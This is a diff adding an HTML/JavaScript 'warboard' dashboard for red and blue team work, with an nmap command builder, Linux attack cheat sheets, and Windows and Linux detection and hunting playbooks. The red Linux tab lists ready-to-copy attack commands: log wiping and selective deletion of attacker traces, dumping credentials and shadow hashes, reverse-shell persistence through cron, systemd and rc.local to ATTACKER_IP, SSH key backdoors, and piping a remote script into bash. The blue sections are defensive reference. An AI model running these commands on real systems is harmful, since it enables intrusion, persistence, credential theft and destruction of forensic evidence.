+          <label class="nmap-opt"><input type="checkbox" id="sc-dns" onchange="buildNmap()"><span class="nmap-opt-lbl">DNS zone xfer <span class="nmap-opt-sw">--script dns-zone-transfer</span><span class="nmap-opt-desc">Attempt AXFR against target DNS</span></span></label>
+          <label class="nmap-opt"><input type="checkbox" id="sc-ftp" onchange="buildNmap()"><span class="nmap-opt-lbl">FTP anon check <span class="nmap-opt-sw">--script ftp-anon</span><span class="nmap-opt-desc">Test for anonymous FTP login</span></span></label>
+          <label class="nmap-opt"><input type="checkbox" id="sc-ssh" onchange="buildNmap()"><span class="nmap-opt-lbl">SSH algorithms <span class="nmap-opt-sw">--script ssh2-enum-algos</span><span class="nmap-opt-desc">List supported SSH ciphers</span></span></label>
+        </div>
+        <div class="nmap-group">
+          <div class="nmap-group-title">OUTPUT FORMAT</div>
+          <label class="nmap-opt"><input type="radio" name="outfmt" value="" checked onchange="buildNmap()"><span class="nmap-opt-lbl">No file output <span class="nmap-opt-desc">Terminal only</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="outfmt" value="-oN" onchange="buildNmap()"><span class="nmap-opt-lbl">Normal <span class="nmap-opt-sw">-oN</span><span class="nmap-opt-desc">Human-readable file</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="outfmt" value="-oX" onchange="buildNmap()"><span class="nmap-opt-lbl">XML <span class="nmap-opt-sw">-oX</span><span class="nmap-opt-desc">Machine parseable</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="outfmt" value="-oG" onchange="buildNmap()"><span class="nmap-opt-lbl">Grepable <span class="nmap-opt-sw">-oG</span><span class="nmap-opt-desc">Easy to grep results</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="outfmt" value="-oA" onchange="buildNmap()"><span class="nmap-opt-lbl">All formats <span class="nmap-opt-sw">-oA</span><span class="nmap-opt-desc">Normal + XML + grepable</span></span></label>
+        </div>
+      </div>
+    </div>
+    <div style="margin-top:10px;">
+      <div class="nmap-output-label">GENERATED COMMAND -- click to copy</div>
+      <div class="nmap-output" id="nmapCmd" onclick="copyNmap()">nmap -sS -T3 &lt;target&gt;</div>
+      <div class="nmap-copy-hint" id="nmapCopyHint">Click command to copy to clipboard</div>
+    </div>
+    <div class="slbl" style="margin-top:16px;">Common One-liners</div>
+    <div class="rcard"><div class="cmd-block">
+      <div class="cmd-label">Quick triage -- live hosts then service scan</div>
+      <div class="cmd" onclick="copyCmd(this)">nmap -sn 10.0.0.0/24 && nmap -sS -sV -T4 --open -iL live_hosts.txt</div>
+      <div class="cmd-label">Full port discovery then targeted service scan</div>
+      <div class="cmd" onclick="copyCmd(this)">nmap -p- -T4 --min-rate 5000 10.0.0.1 -oG allports.txt && nmap -sV -sC -p$(grep open allports.txt | cut -d/ -f1 | tr '\n' ',') 10.0.0.1</div>
+      <div class="cmd-label">Stealth scan with OS detection</div>
+      <div class="cmd" onclick="copyCmd(this)">nmap -sS -O -T2 -Pn --open 10.0.0.1</div>
+      <div class="cmd-label">SMB vulnerability check across subnet</div>
+      <div class="cmd" onclick="copyCmd(this)">nmap -p 445 --script smb-vuln-ms17-010,smb-enum-shares,smb2-security-mode 10.0.0.0/24</div>
+      <div class="cmd-label">Web application scan</div>
+      <div class="cmd" onclick="copyCmd(this)">nmap -sV -p 80,443,8080,8443,8000,8888 --script http-enum,http-headers,http-methods 10.0.0.1</div>
+      <div class="cmd-label">UDP top ports</div>
+      <div class="cmd" onclick="copyCmd(this)">nmap -sU --top-ports 100 -T4 10.0.0.1</div>
+    </div></div>
+  </div>
+
+  <!-- RED LINUX -->
+  <div class="tc" id="tc-linux">
+    <div class="slbl">LOG LOCATIONS</div>
+    <div class="rcard"><div class="rtitle">KEY LOG FILES</div><table class="rtbl">
+      <tr><td>/var/log/auth.log</td><td>SSH, sudo, su logins -- Debian/Ubuntu</td></tr>
+      <tr><td>/var/log/secure</td><td>SSH, sudo, su logins -- RHEL/CentOS</td></tr>
+      <tr><td>/var/log/syslog</td><td>General system events -- Debian/Ubuntu</td></tr>
+      <tr><td>/var/log/messages</td><td>General system events -- RHEL/CentOS</td></tr>
+      <tr><td>/var/log/wtmp</td><td>Binary login history -- read with: last</td></tr>
+      <tr><td>/var/log/btmp</td><td>Failed logins -- read with: lastb</td></tr>
+      <tr><td>/var/log/lastlog</td><td>Last login per user -- read with: lastlog</td></tr>
+      <tr><td>/var/log/cron</td><td>Cron job execution log</td></tr>
+      <tr><td>/var/log/apache2/</td><td>Apache access + error logs</td></tr>
+      <tr><td>/var/log/nginx/</td><td>Nginx access + error logs</td></tr>
+      <tr><td>/var/log/audit/audit.log</td><td>Auditd -- syscall level logging</td></tr>
+      <tr><td>~/.bash_history</td><td>User command history -- check all users</td></tr>
+      <tr><td>/root/.bash_history</td><td>Root command history</td></tr>
+    </table></div>
+
+    <div class="slbl">LOG CLEANING PLAYBOOK</div>
+    <div class="rcard"><div class="rtitle">COVERING TRACKS</div><div class="cmd-block">
+      <div class="cmd-label">Prevent history being written (run first)</div>
+      <div class="cmd" onclick="copyCmd(this)">unset HISTFILE && export HISTSIZE=0 && export HISTFILESIZE=0</div>
+      <div class="cmd-label">Clear current session history</div>
+      <div class="cmd" onclick="copyCmd(this)">history -c && history -w</div>
+      <div class="cmd-label">Surgical removal -- delete lines matching your IP</div>
+      <div class="cmd" onclick="copyCmd(this)">sed -i '/ATTACKER_IP/d' /var/log/auth.log /var/log/syslog</div>
+      <div class="cmd-label">Surgical removal -- delete lines matching your username</div>
+      <div class="cmd" onclick="copyCmd(this)">sed -i '/yourusername/d' /var/log/auth.log /var/log/secure</div>
+      <div class="cmd-label">Truncate auth log (obvious gap -- last resort)</div>
+      <div class="cmd" onclick="copyCmd(this)">truncate -s 0 /var/log/auth.log</div>
+      <div class="cmd-label">Clear wtmp and btmp (last / lastb data)</div>
+      <div class="cmd" onclick="copyCmd(this)">echo "" > /var/log/wtmp && echo "" > /var/log/btmp && echo "" > /var/log/lastlog</div>
+      <div class="cmd-label">Restore original file timestamps after editing</div>
+      <div class="cmd" onclick="copyCmd(this)">touch -r /var/log/auth.log.bak /var/log/auth.log</div>
+      <div class="cmd-warn">NOTE: Log gaps and sudden file size changes are IOCs. Surgical sed removal is harder to detect than wiping. Check if auditd is running first -- it may log your log edits.</div>
+    </div></div>
+
+    <div class="slbl">CREDENTIAL ENUMERATION</div>
+    <div class="rcard"><div class="rtitle">PASSWORD AND CREDENTIAL LOCATIONS</div><table class="rtbl">
+      <tr><td>/etc/passwd</td><td>User accounts -- world readable</td></tr>
+      <tr><td>/etc/shadow</td><td>Password hashes -- root only (usually)</td></tr>
+      <tr><td>/etc/sudoers</td><td>Sudo permissions -- check for NOPASSWD</td></tr>
+      <tr><td>/etc/sudoers.d/</td><td>Sudoers drop-in files -- often overlooked</td></tr>
+      <tr><td>~/.ssh/id_rsa</td><td>Private SSH keys -- check all home dirs</td></tr>
+      <tr><td>~/.ssh/authorized_keys</td><td>Authorised keys -- add yours for persistence</td></tr>
+      <tr><td>~/.ssh/known_hosts</td><td>Hosts user has SSH'd to -- pivot map</td></tr>
+      <tr><td>~/.netrc</td><td>Plaintext FTP/HTTP credentials</td></tr>
+      <tr><td>/var/www/html/config*</td><td>Web app configs -- often contain DB creds</td></tr>
+      <tr><td>/proc/*/environ</td><td>Process environment vars -- may contain secrets</td></tr>
+    </table></div>
+    <div class="rcard"><div class="rtitle">CREDENTIAL HUNTING COMMANDS</div><div class="cmd-block">
+      <div class="cmd-label">Check sudo rights (no password entries)</div>
+      <div class="cmd" onclick="copyCmd(this)">sudo -l</div>
+      <div class="cmd-label">Find SSH private keys on filesystem</div>
+      <div class="cmd" onclick="copyCmd(this)">find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null</div>
+      <div class="cmd-label">Grep for passwords in config files</div>
+      <div class="cmd" onclick="copyCmd(this)">grep -ri "password\|passwd\|secret\|token" /etc/ /var/www/ /home/ 2>/dev/null | grep -v Binary</div>
+      <div class="cmd-label">Check environment variables for secrets</div>
+      <div class="cmd" onclick="copyCmd(this)">env | grep -i "pass\|key\|token\|secret\|api"</div>
+      <div class="cmd-label">Find .env files (often contain plaintext creds)</div>
+      <div class="cmd" onclick="copyCmd(this)">find / -name ".env" -o -name "*.env" 2>/dev/null | xargs grep -l "pass\|key\|secret" 2>/dev/null</div>
+      <div class="cmd-label">Check process environments for leaked secrets</div>
+      <div class="cmd" onclick="copyCmd(this)">strings /proc/*/environ 2>/dev/null | grep -i "pass\|key\|token\|secret"</div>
+      <div class="cmd-label">Dump shadow hashes if root</div>
+      <div class="cmd" onclick="copyCmd(this)">cat /etc/shadow | awk -F: '$2 !~ /^[!*]/ {print $1":"$2}'</div>
+    </div></div>
+
+    <div class="slbl">PERSISTENCE LOCATIONS</div>
+    <div class="rcard"><div class="rtitle">CRON LOCATIONS -- ALL NEED CHECKING</div><table class="rtbl">
+      <tr><td>/etc/crontab</td><td>System-wide crontab -- any user can be set</td></tr>
+      <tr><td>/etc/cron.d/</td><td>Drop-in cron jobs -- frequently overlooked</td></tr>
+      <tr><td>/etc/cron.hourly/</td><td>Scripts run every hour</td></tr>
+      <tr><td>/etc/cron.daily/</td><td>Scripts run daily</td></tr>
+      <tr><td>/etc/cron.weekly/</td><td>Scripts run weekly</td></tr>
+      <tr><td>/etc/cron.monthly/</td><td>Scripts run monthly</td></tr>
+      <tr><td>/var/spool/cron/crontabs/</td><td>Per-user crontabs -- check all users</td></tr>
+    </table></div>
+    <div class="rcard"><div class="rtitle">OTHER PERSISTENCE LOCATIONS</div><table class="rtbl">
+      <tr><td>/etc/rc.local</td><td>Runs at boot -- classic persistence</td></tr>
+      <tr><td>/etc/init.d/</td><td>SysV init scripts</td></tr>
+      <tr><td>/etc/systemd/system/</td><td>Systemd service units -- add malicious service</td></tr>
+      <tr><td>~/.bashrc, ~/.bash_profile</td><td>Runs on user login -- per-user persistence</td></tr>
+      <tr><td>/etc/profile.d/</td><td>Runs on all user logins -- system-wide</td></tr>
+      <tr><td>/etc/ld.so.preload</td><td>Library preload -- rootkit technique</td></tr>
+      <tr><td>/etc/pam.d/</td><td>PAM config -- can backdoor authentication</td></tr>
+    </table></div>
+    <div class="rcard"><div class="rtitle">MALWARE EXECUTION LOCATIONS</div><table class="rtbl">
+      <tr><td>/tmp/, /var/tmp/</td><td>World-writable -- common dropper staging</td></tr>
+      <tr><td>/dev/shm/</td><td>RAM-backed tmpfs -- vanishes on reboot</td></tr>
+      <tr><td>/var/www/html/</td><td>Webshell drops -- if web server writable</td></tr>
+      <tr><td>/usr/local/bin/</td><td>Trojanised binaries -- often in PATH</td></tr>
+      <tr><td>~/.config/</td><td>Hidden user-level persistence</td></tr>
+      <tr><td>/etc/ld.so.preload</td><td>Shared library injection -- rootkit</td></tr>
+    </table></div>
+    <div class="rcard"><div class="rtitle">PERSISTENCE COMMANDS</div><div class="cmd-block">
+      <div class="cmd-label">Add reverse shell via cron (every minute)</div>
+      <div class="cmd" onclick="copyCmd(this)">(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1") | crontab -</div>
+      <div class="cmd-label">Add SSH public key for persistent access</div>
+      <div class="cmd" onclick="copyCmd(this)">mkdir -p ~/.ssh && echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys</div>
+      <div class="cmd-label">Create malicious systemd service</div>
+      <div class="cmd" onclick="copyCmd(this)">echo -e '[Unit]\nDescription=System Update\n[Service]\nExecStart=/bin/bash -i >& /dev/tcp/IP/PORT 0>&1\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/sysupdate.service && systemctl enable sysupdate && systemctl start sysupdate</div>
+      <div class="cmd-label">Add backdoor to /etc/rc.local</div>
+      <div class="cmd" onclick="copyCmd(this)">echo "nohup bash -i >& /dev/tcp/IP/PORT 0>&1 &" >> /etc/rc.local</div>
+    </div></div>
+
+    <div class="slbl">PRIVILEGE ESCALATION</div>
+    <div class="rcard"><div class="rtitle">ENUMERATION COMMANDS</div><div class="cmd-block">
+      <div class="cmd-label">Current user context</div>
+      <div class="cmd" onclick="copyCmd(this)">id && whoami && groups</div>
+      <div class="cmd-label">Kernel and OS version (check for exploits)</div>
+      <div class="cmd" onclick="copyCmd(this)">uname -a && cat /etc/os-release</div>
+      <div class="cmd-label">Find all SUID binaries</div>
+      <div class="cmd" onclick="copyCmd(this)">find / -perm -4000 -type f 2>/dev/null | xargs ls -la</div>
+      <div class="cmd-label">Find all SGID binaries</div>
+      <div class="cmd" onclick="copyCmd(this)">find / -perm -2000 -type f 2>/dev/null | xargs ls -la</div>
+      <div class="cmd-label">Find world-writable directories</div>
+      <div class="cmd" onclick="copyCmd(this)">find / -writable -type d 2>/dev/null | grep -v proc</div>
+      <div class="cmd-label">Check Linux capabilities (can replace SUID)</div>
+      <div class="cmd" onclick="copyCmd(this)">getcap -r / 2>/dev/null</div>
+      <div class="cmd-label">Check for Docker socket access (= root)</div>
+      <div class="cmd" onclick="copyCmd(this)">ls -la /var/run/docker.sock 2>/dev/null</div>
+      <div class="cmd-label">NFS exports (no_root_squash = priv esc)</div>
+      <div class="cmd" onclick="copyCmd(this)">cat /etc/exports 2>/dev/null && showmount -e localhost 2>/dev/null</div>
+      <div class="cmd-label">Check PATH for writable directories</div>
+      <div class="cmd" onclick="copyCmd(this)">echo $PATH | tr ':' '\n' | xargs -I{} ls -la {} 2>/dev/null</div>
+      <div class="cmd-label">Automated enum -- LinPEAS</div>
+      <div class="cmd" onclick="copyCmd(this)">curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</div>
+    </div></div>
+    <div class="slbl">Findings</div>
+    <textarea class="scta" placeholder="Credentials found, persistence mechanisms, priv esc paths..."></textarea>
+  </div>
+
+  <!-- WEBSITES / BOOKMARKS -->
+  <div class="tc" id="tc-websites">
+    <div class="slbl">Resource Bookmarks</div>
+    <div id="bkmarks"></div>
+  </div>
+
+  <!-- BLUE MITRE -->
+  <div class="tc" id="tc-blue-mitre"><div id="blueMC"></div></div>
+
+  <!-- BLUE DETECTIONS -->
+  <div class="tc" id="tc-blue-det">
+    <div class="rcard"><div class="rtitle">KEY WINDOWS EVENT IDS</div><table class="rtbl">
+      <tr><td>4624</td><td>Successful logon -- monitor type 3 (network)</td></tr>
+      <tr><td>4625</td><td>Failed logon -- brute force indicator</td></tr>
+      <tr><td>4648</td><td>Logon with explicit creds -- PTH / lateral movement</td></tr>
+      <tr><td>4662</td><td>AD object access -- DCSync uses replication rights</td></tr>
+      <tr><td>4688</td><td>Process creation -- enable command line logging</td></tr>
+      <tr><td>4698</td><td>Scheduled task created -- persistence IOC</td></tr>
+      <tr><td>4720</td><td>User account created</td></tr>
+      <tr><td>4732</td><td>Member added to privileged group</td></tr>
+      <tr><td>4768</td><td>Kerberos TGT request (AS-REQ)</td></tr>
+      <tr><td>4769</td><td>Kerberos TGS request -- RC4 = Kerberoast</td></tr>
+      <tr><td>4776</td><td>NTLM authentication attempt</td></tr>
+      <tr><td>7045</td><td>New service installed -- PsExec IOC</td></tr>
+      <tr><td>1102</td><td>Audit log cleared -- major red flag</td></tr>
+    </table></div>
+    <div class="rcard"><div class="rtitle">SIEM STARTERS (SPLUNK)</div><table class="rtbl">
+      <tr><td>Brute force</td><td>EventCode=4625 | stats count by src_ip | where count>10</td></tr>
+      <tr><td>Kerberoast</td><td>EventCode=4769 TicketEncryptionType=0x17</td></tr>
+      <tr><td>Pass-the-Hash</td><td>EventCode=4624 LogonType=3 AuthPackage=NTLM</td></tr>
+      <tr><td>DCSync</td><td>EventCode=4662 Properties=*1131f6ad*</td></tr>
+      <tr><td>LSASS access</td><td>EventCode=10 TargetImage=*lsass* NOT SourceImage=*system32*</td></tr>
+      <tr><td>Log cleared</td><td>EventCode=1102 OR EventCode=104</td></tr>
+    </table></div>
+    <div class="rcard"><div class="rtitle">BLUE TEAM TOOLS</div><table class="rtbl">
+      <tr><td><a class="tl" href="https://docs.velociraptor.app" target="_blank" rel="noopener">Velociraptor</a></td><td>DFIR -- live endpoint interrogation</td></tr>
+      <tr><td><a class="tl" href="https://www.elastic.co/siem" target="_blank" rel="noopener">Elastic SIEM</a></td><td>Detection rules, EQL threat hunting</td></tr>
+      <tr><td><a class="tl" href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noopener">Sigma Rules</a></td><td>Detection rule framework (vendor-agnostic)</td></tr>
+      <tr><td><a class="tl" href="https://suricata.io" target="_blank" rel="noopener">Suricata</a></td><td>IDS/IPS -- network signatures</td></tr>
+      <tr><td><a class="tl" href="https://thehive-project.org" target="_blank" rel="noopener">TheHive</a></td><td>IR case management</td></tr>
+      <tr><td><a class="tl" href="https://www.misp-project.org" target="_blank" rel="noopener">MISP</a></td><td>Threat intel sharing platform</td></tr>
+      <tr><td><a class="tl" href="https://www.volatilityfoundation.org" target="_blank" rel="noopener">Volatility</a></td><td>Memory forensics</td></tr>
+      <tr><td><a class="tl" href="https://www.pingcastle.com" target="_blank" rel="noopener">PingCastle</a></td><td>AD security auditing</td></tr>
+    </table></div>
+    <div class="slbl">IR Notes</div>
+    <textarea class="scta" placeholder="IOCs, timeline, affected hosts, escalation notes..."></textarea>
+  </div>
+
+  <!-- BLUE LINUX -->
+  <div class="tc" id="tc-blue-linux">
+    <div class="slbl">LOG AUDIT PLAYBOOK</div>
+    <div class="rcard"><div class="rtitle">INITIAL TRIAGE -- RUN IN ORDER</div><div class="cmd-block">
+      <div class="cmd-label">1. Recent logins</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">last -a | head -50</div>
+      <div class="cmd-label">2. Failed login attempts</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">lastb | head -50</div>
+      <div class="cmd-label">3. Last login per user -- look for unusual accounts</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">lastlog | grep -v "Never logged in"</div>
+      <div class="cmd-label">4. Currently logged in users</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">who && w</div>
+      <div class="cmd-label">5. SSH auth events -- Debian/Ubuntu</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">grep "sshd" /var/log/auth.log | grep -E "Accepted|Failed|Invalid|session opened" | tail -100</div>
+      <div class="cmd-label">6. SSH auth events -- RHEL/CentOS</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">grep "sshd" /var/log/secure | grep -E "Accepted|Failed|Invalid|session opened" | tail -100</div>
+      <div class="cmd-label">7. Sudo usage audit</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">grep "sudo" /var/log/auth.log | tail -100</div>
+      <div class="cmd-label">8. Check log file sizes -- gaps or truncation are IOCs</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">ls -lah /var/log/auth.log /var/log/syslog /var/log/wtmp /var/log/btmp</div>
+      <div class="cmd-label">9. Check if auditd is running</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">systemctl status auditd && ausearch -m login -ts today 2>/dev/null</div>
+      <div class="cmd-label">10. Check command history for all users</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">for u in $(cut -f1 -d: /etc/passwd); do echo "=== $u ==="; cat /home/$u/.bash_history 2>/dev/null; done && cat /root/.bash_history 2>/dev/null</div>
+    </div></div>
+
+    <div class="slbl">PERSISTENCE HUNTING</div>
+    <div class="rcard"><div class="rtitle">CRON AUDIT</div><div class="cmd-block">
+      <div class="cmd-label">System crontab</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">cat /etc/crontab && ls -la /etc/cron.d/ && ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/</div>
+      <div class="cmd-label">All user crontabs</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">for u in $(cut -f1 -d: /etc/passwd); do ct=$(crontab -l -u $u 2>/dev/null); if [ -n "$ct" ]; then echo "=== $u ==="; echo "$ct"; fi; done</div>
+      <div class="cmd-label">Recent cron activity in logs</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">grep "CRON" /var/log/syslog | tail -100</div>
+      <div class="cmd-warn">RED FLAGS: Jobs pointing to /tmp/ or /dev/shm/. Base64 encoded commands. wget/curl piped to bash. Reverse shell one-liners. Recently modified cron files.</div>
+    </div></div>
+    <div class="rcard"><div class="rtitle">STARTUP PERSISTENCE AUDIT</div><div class="cmd-block">
+      <div class="cmd-label">Check rc.local</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">cat /etc/rc.local 2>/dev/null</div>
+      <div class="cmd-label">Recently modified systemd units (last 7 days)</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">find /etc/systemd/ /lib/systemd/ -name "*.service" -mtime -7 -ls 2>/dev/null</div>
+      <div class="cmd-label">All enabled systemd services</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">systemctl list-unit-files --type=service --state=enabled</div>
+      <div class="cmd-label">Check profile.d for additions</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">ls -la /etc/profile.d/ && cat /etc/profile.d/*.sh 2>/dev/null</div>
+      <div class="cmd-label">Check user bash profiles for persistence</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">for u in $(cut -f1 -d: /etc/passwd); do echo "=== $u bashrc ==="; cat /home/$u/.bashrc /home/$u/.bash_profile 2>/dev/null; done</div>
+      <div class="cmd-label">Check ld.so.preload -- rootkit indicator</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">cat /etc/ld.so.preload 2>/dev/null && echo "WARNING: ld.so.preload exists" || echo "OK: not present"</div>
+    </div></div>
+    <div class="rcard"><div class="rtitle">SSH BACKDOOR HUNT</div><div class="cmd-block">
+      <div class="cmd-label">Check authorized_keys for all users</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">for u in $(cut -f1 -d: /etc/passwd); do f="/home/$u/.ssh/authorized_keys"; if [ -f "$f" ]; then echo "=== $u ==="; cat "$f"; fi; done && cat /root/.ssh/authorized_keys 2>/dev/null</div>
+      <div class="cmd-label">Check SSH config for dangerous settings</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">grep -E "PermitRootLogin|PasswordAuthentication|PermitEmptyPasswords|AuthorizedKeysFile" /etc/ssh/sshd_config</div>
+    </div></div>
+
+    <div class="slbl">ACTIVE THREAT HUNTING</div>
+    <div class="rcard"><div class="rtitle">COMPROMISE INDICATORS</div><div class="cmd-block">
+      <div class="cmd-label">Find recently modified files (last 24h) -- exclude noisy paths</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">find / -mtime -1 -type f 2>/dev/null | grep -v -E "/proc|/sys|/run|/dev"</div>
+      <div class="cmd-label">Executables in /tmp or /dev/shm -- major IOC</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">find /tmp /dev/shm /var/tmp -type f -executable 2>/dev/null</div>
+      <div class="cmd-label">Hidden files in writable locations</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">find /tmp /var/tmp /dev/shm /home -name ".*" -type f 2>/dev/null</div>
+      <div class="cmd-label">Processes running from suspicious paths</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">ps aux | grep -E "/tmp|/dev/shm|/var/tmp|bash -i|nc -e"</div>
+      <div class="cmd-label">Unusual listening ports -- check everything not loopback</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">ss -tlnp | grep -v "127.0.0.1\|::1"</div>
+      <div class="cmd-label">Established outbound connections -- spot C2</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">ss -tnp state established</div>
+      <div class="cmd-label">Unusual SUID binaries -- diff against known good</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">find / -perm -4000 -type f 2>/dev/null | sort</div>
+      <div class="cmd-label">Check /etc/passwd for new or UID 0 accounts</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">awk -F: '$3 == 0 {print "ROOT UID ACCOUNT: " $1}' /etc/passwd</div>
+      <div class="cmd-label">Check PAM config for modifications (last 7 days)</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">find /etc/pam.d/ -mtime -7 -ls</div>
+      <div class="cmd-label">File integrity check if aide installed</div>
+      <div class="cmd blue-cmd" onclick="copyCmd(this)">aide --check 2>/dev/null || tripwire --check 2>/dev/null || echo "No integrity checker installed"</div>
+      <div class="cmd-warn">ESCALATE IF: Executables in /tmp or /dev/shm. New UID 0 accounts. ld.so.preload file present. Unexpected outbound connections. Log files truncated or with gaps.</div>
+    </div></div>
+    <div class="slbl">IR Notes</div>
+    <textarea class="scta" placeholder="IOCs found, affected users, suspicious processes, timeline..."></textarea>
+  </div>
+
+  <!-- BLUE SUBNET -->
+  <div class="tc" id="tc-blue-subnet">
+    <div class="slbl">Subnet Calculator</div>
+    <div class="irow">
+      <input class="inp md" id="snI2" placeholder="192.168.1.0/24" onkeydown="if(event.key==='Enter')doSN('snI2','snR2')">
+      <button class="btn" onclick="doSN('snI2','snR2')">CALC</button>
+    </div>
+    <div class="snres" id="snR2"></div>
+  </div>
+
+</div>
+<!-- RIGHT PANEL -->
+<div class="rp">
+  <div class="rsec">
+    <div class="rtit">ENGAGEMENT PROGRESS</div>
+    <div id="progD"></div>
+  </div>
+  <div class="rsec">
+    <div class="rtit">OP LOG</div>
+    <div class="olog" id="olog"></div>
+    <div class="linrow">
+      <input class="lin" id="lin" placeholder="Log entry..." onkeydown="if(event.key==='Enter')addLog()">
+      <button class="btn" onclick="addLog()">LOG</button>
+    </div>
+  </div>
+  <div class="rsec fg">
+    <div class="rtit">PHASE STATUS</div>
+    <div id="phCtrl"></div>
+  </div>
+</div>
+</div></div>
+
+<script>
+var mode = "red";
+function setMode(m) {
+  mode = m;
+  document.getElementById("boardTitle").textContent = m==="red" ? "RED TEAM WARBOARD" : "BLUE TEAM WARBOARD";
+  document.getElementById("boardTitle").style.color = m==="red" ? "#00ff88" : "#58a6ff";
+  document.getElementById("opStat").style.color = m==="red" ? "#00ff88" : "#58a6ff";
+  document.getElementById("rmBtn").classList.toggle("act", m==="red");
+  document.getElementById("bmBtn").classList.toggle("act", m==="blue");
+  buildTabs(); renderProg(); renderPhCtrl();
+}
+
+var RTABS = [{id:"mitre",lbl:"MITRE"},{id:"ipmapper",lbl:"IP MAP"},{id:"tunnels",lbl:"TUNNELS"},{id:"knowledge",lbl:"KNOWLEDGE"},{id:"nmap",lbl:"NMAP"},{id:"linux",lbl:"LINUX"},{id:"subnet",lbl:"SUBNET"},{id:"websites",lbl:"RESOURCES"}];
+var BTABS = [{id:"blue-mitre",lbl:"MITRE DEFEND"},{id:"blue-det",lbl:"WIN DETECTIONS"},{id:"blue-linux",lbl:"LINUX DEFENCE"},{id:"websites",lbl:"RESOURCES"},{id:"blue-subnet",lbl:"SUBNET"}];
+
+function buildTabs() {
+  var tabs = mode==="red" ? RTABS : BTABS;
+  document.getElementById("tabBar").innerHTML = tabs.map(function(t,i) {
+    return '<div class="tab '+(i===0?"act":"")+'" id="tb-'+t.id+'" onclick="swTab(\''+t.id+'\')">'+t.lbl+'</div>';
+  }).join("");
+  document.querySelectorAll(".tc").forEach(function(c){ c.classList.remove("act"); });
+  document.getElementById("tc-"+tabs[0].id).classList.add("act");
+}
+
+function swTab(id) {
+  var tabs = mode==="red" ? RTABS : BTABS;
+  tabs.forEach(function(t){ var b=document.getElementById("tb-"+t.id); if(b) b.classList.toggle("act", t.id===id); });
+  document.querySelectorAll(".tc").forEach(function(c){ c.classList.remove("act"); });
+  document.getElementById("tc-"+id).classList.add("act");
+}
+
+var RP=[
+  {id:"recon",cls:"p-r",lbl:"01 - RECON",noise:1,obj:"Map the target externally -- no packets on their network. Identify attack surface, people, tech stack, entry vectors.",
+   techs:[
+    {n:"Passive DNS",t:[{l:"DNSDumpster",u:"https://dnsdumpster.com"},{l:"MXToolbox",u:"https://mxtoolbox.com"}],f:"Fully passive -- no target contact"},
+    {n:"Cert Transparency",t:[{l:"crt.sh",u:"https://crt.sh"},{l:"Censys",u:"https://search.censys.io"}],f:"Public logs -- no target contact"},
+    {n:"Shodan / Censys",t:[{l:"Shodan",u:"https://www.shodan.io"},{l:"Censys",u:"https://search.censys.io"}],f:"Queries existing scan data -- passive"},
+    {n:"Google Dorking",t:[{l:"Google",u:"https://google.com"},{l:"Grayhatwarfare",u:"https://grayhatwarfare.com"}],f:"Public searches -- no target contact"},
+    {n:"WHOIS / ASN",t:[{l:"ARIN",u:"https://search.arin.net"},{l:"BGP.he.net",u:"https://bgp.he.net"}],f:"Minimal -- passive lookups"},
+    {n:"OSINT / Email",t:[{l:"theHarvester",u:"https://github.com/laramies/theHarvester"},{l:"Hunter.io",u:"https://hunter.io"}],f:"LinkedIn profile views may be visible"},
+   ],
+   app:"SPF/DMARC posture informs phishing viability. CNAME danglers indicate subdomain takeover. Job postings reveal tech stack.",
+   ioc:"AXFR zone transfer attempts logged on target nameservers.",url:"https://attack.mitre.org/tactics/TA0043/"},
+  {id:"weapon",cls:"p-w",lbl:"02 - WEAPONISATION",noise:1,obj:"Build or select payloads tailored to identified stack, AV/EDR environment, and delivery method.",
+   techs:[
+    {n:"Payload crafting",t:[{l:"msfvenom",u:"https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html"},{l:"Sliver",u:"https://github.com/BishopFox/sliver"},{l:"Havoc",u:"https://github.com/HavocFramework/Havoc"}],f:"Sig-based AV catches known templates"},
+    {n:"Obfuscation",t:[{l:"Shellter",u:"https://www.shellterproject.com"},{l:"Donut",u:"https://github.com/TheWover/donut"}],f:"Behavioural EDR watches execution patterns"},
